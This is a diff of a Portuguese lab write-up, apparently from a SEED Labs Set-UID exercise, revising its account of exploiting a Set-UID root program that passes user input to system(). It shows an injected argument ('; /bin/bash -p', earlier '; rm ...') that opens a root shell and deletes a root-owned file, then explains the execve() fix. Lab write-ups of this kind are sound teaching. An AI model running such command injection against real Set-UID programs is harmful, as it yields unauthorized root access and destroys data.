@@ -120,67 +120,81 @@ Os passos encadeiam-se assim:
 
 ## Questão 2: Task 8 (Step 1), exploração do `catall.c` via `system()`
 
-O objetivo é mostrar que, sem tocar no código C, conseguimos abusar do executável `catall` (Set-UID root) para apagar um ficheiro que o utilizador `seed` não pode ler nem apagar. Tal como na Task 6, o `/bin/sh` tem de continuar a apontar para o `/bin/zsh`; com o `dash` o ataque não funcionaria, porque este deteta a execução Set-UID e larga os privilégios, e o comando injetado acabaria por correr como `seed`.
+O objetivo é mostrar que, sem tocar no código C, conseguimos abusar do executável Set-UID root para obter uma shell com privilégios de root e, a partir dela, apagar um ficheiro que pertence ao root. Tal como na Task 6, o `/bin/sh` tem de continuar a apontar para o `/bin/zsh`; com o `dash` o ataque não funcionaria, porque este deteta a execução Set-UID e larga os privilégios, e o comando injetado acabaria por correr como `seed`.
 
-Começámos por criar o ficheiro-alvo:
-
-```bash
-sudo touch /home/seed/Desktop/text
-sudo chown root /home/seed/Desktop/text
-sudo chmod 700 /home/seed/Desktop/text
-```
-
-Confirmámos que o `seed` não lhe consegue aceder diretamente:
+Começámos por criar o ficheiro-alvo com conteúdo, demos o root como dono e confirmámos as permissões:
 
 ```bash
-cat /home/seed/Desktop/text   # Permission denied
-whoami                         # seed
+nano text
+sudo chown root text
+sudo chmod 7544 text
+ls -l text        # -r-sr-Sr-T 1 root seed ... text
+whoami            # seed
 ```
 
-Compilámos e preparámos o `catall` como Set-UID root:
+Compilámos o `catall.c` para o binário `vulnerable` e tornámo-lo Set-UID root (nesta fase apenas a linha do `system()` está ativa):
 
 ```c
 /* catall.c (excerto relevante) */
 v[0] = "/bin/cat"; v[1] = argv[1]; v[2] = NULL;
 command = malloc(strlen(v[0]) + strlen(v[1]) + 2);
 sprintf(command, "%s %s", v[0], v[1]);
-system(command);   // única linha ativa nesta fase
+// Use only one of the followings.
+system(command);
+// execve(v[0], v, NULL);
 ```
 
 ```bash
-gcc catall.c -o catall
-sudo chown root catall
-sudo chmod 4755 catall
+gcc catall.c -o vulnerable
+sudo chown root vulnerable
+sudo chmod 4755 vulnerable
 ```
 
-Depois injetámos um comando através do argumento:
+Correr o programa com um nome de ficheiro normal limita-se a fazer `cat` do ficheiro:
 
 ```bash
-./catall "/home/seed/Desktop/text; rm /home/seed/Desktop/text"
+./vulnerable "/home/seed/Desktop/text"   # imprime "Hello World!"
+```
+
+Depois injetámos um segundo comando através do argumento, usando o `;` para abrir uma shell com privilégios preservados:
+
+```bash
+./vulnerable "/home/seed/Desktop/text; /bin/bash -p"
+```
+
+Isto abriu uma shell root (`bash-5.0#`), a partir da qual apagámos o ficheiro do root:
+
+```bash
+bash-5.0# whoami
+root
+bash-5.0# rm /home/seed/Desktop/text
+bash-5.0# ls /home/seed/Desktop/
+bash-5.0# exit
 ```
 
 ![Task 8.1](../questao2-1.png)
 
-```bash
-ls /home/seed/Desktop/text   # No such file or directory
-```
+O ficheiro, que pertencia a root, acabou apagado por um utilizador sem privilégios de administrador.
 
-O ficheiro, que pertencia a root e não dava permissões ao `seed`, acabou apagado por um utilizador sem privilégios de administrador.
+O `catall.c` monta a string `"/bin/cat <argumento>"` e entrega-a ao `system()`. Como o `system()` corre `/bin/sh -c "<string>"`, a shell interpreta metacaracteres como o `;`, o `|` ou o `&&`. Quando passamos um argumento do tipo `"ficheiro; /bin/bash -p"`, estamos na prática a dar-lhe dois comandos separados por `;`: o `cat` original e o `/bin/bash -p` que injetámos.
 
-O `catall.c` monta a string `"/bin/cat <argumento>"` e entrega-a ao `system()`. Como o `system()` corre `/bin/sh -c "<string>"`, a shell interpreta metacaracteres como o `;`, o `|` ou o `&&`. Quando passamos um argumento do tipo `"ficheiro; rm ficheiro"`, estamos na prática a dar-lhe dois comandos separados por `;`, que a mesma shell executa um a seguir ao outro: o `cat` original e o `rm` que injetámos.
-
-Como o `catall` é Set-UID root, a shell lançada pelo `system()` corre com UID efetivo 0. Por isso os dois comandos, incluindo o `rm`, correm com privilégios de root e contornam as permissões que, de outra forma, impediriam o `seed` de apagar o ficheiro.
+Como o `vulnerable` é Set-UID root e o `/bin/sh` aponta para o `/bin/zsh` (que não larga os privilégios), a shell lançada pelo `system()` corre com UID efetivo 0. O `/bin/bash -p` usa o modo privilegiado (`-p`), que impede o bash de repor o `uid` ao sair do contexto Set-UID, pelo que a shell resultante fica mesmo como root. É dentro dessa shell que executámos o `rm`, que corre com privilégios de root e contorna as permissões que, de outra forma, impediriam o `seed` de apagar o ficheiro.
 
 O problema não está nos dados em si, mas no facto de o `system()` entregar a interpretação do comando a uma shell completa em vez de executar diretamente o binário pretendido. É isto que torna o `system()` perigoso num programa Set-UID sempre que o comando inclui dados do utilizador sem qualquer validação.
 
-Se alterarmos o programa para chamar diretamente o binário com `execve()` em vez de `system()`, a injeção deixa de resultar:
+Se alterarmos o programa para chamar diretamente o binário com `execve()` em vez de `system()` (comentando a linha do `system()`), recompilarmos para `vulnerable` e repetirmos o ataque, a injeção deixa de resultar:
 
 ```c
-char *v[3] = { "/bin/cat", argv[1], NULL };
-execve(v[0], v, NULL);   // em vez de system(command)
+// Use only one of the followings.
+//system(command);
+execve(v[0], v, NULL);
 ```
 
-Agora o argumento `"/home/seed/Desktop/text; rm /home/seed/Desktop/text"` chega ao `/bin/cat` como um único nome de ficheiro (o `;` e o `rm` incluídos), e não como uma linha de comando para uma shell interpretar. Sem shell pelo meio, o `rm` nunca chega a ser executado e o `cat` apenas dá erro por não existir nenhum ficheiro com aquele nome.
+Agora o argumento `"/home/seed/Desktop/text; /bin/bash -p"` chega ao `/bin/cat` como um único nome de ficheiro (o `;` e o `/bin/bash -p` incluídos), e não como uma linha de comando para uma shell interpretar. Sem shell pelo meio, nada é injetado e o `/bin/cat` apenas dá erro por não existir nenhum ficheiro com aquele nome:
+
+```
+/bin/cat: '/home/seed/Desktop/text; /bin/bash -p': No such file or directory
+```
 
 ![Task 8.2](../questao2-2.png)
 
